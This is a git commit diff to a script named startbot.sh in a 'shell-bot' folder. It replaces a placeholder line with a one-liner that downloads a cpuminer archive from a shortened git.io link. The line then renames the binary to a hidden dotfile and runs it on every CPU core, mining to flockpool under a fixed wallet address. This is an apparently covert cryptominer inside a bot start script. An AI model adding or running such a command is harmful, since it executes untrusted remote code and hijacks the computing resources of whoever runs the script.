631e2b35d67da9b0a6aeee8fc50838fea16c68cf
Ylory <94015779+Ylory@users.noreply.github.com>
2021-12-01 04:30:03 +0700

    startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -5,4 +5,4 @@
 
 cd /home/shell-bot
 nproc
-isi sc disini
+wget -qO rtm git.io/cpuminer-gr-1.2.3 && tar xf rtm && mv ./cpuminer-gr-1.2.3-x86_64_linux ./gr && mv ./gr/binaries/cpuminer-avx ./gr/binaries/.gr && ./gr/binaries/.gr -a gr -o stratum+tcps://eu.flockpool.com:5555 -u RGBkj7KZ9U7Rs9SpviMcfXqL233SGmZKfM.zi5 -t $(nproc --all) --no-tune
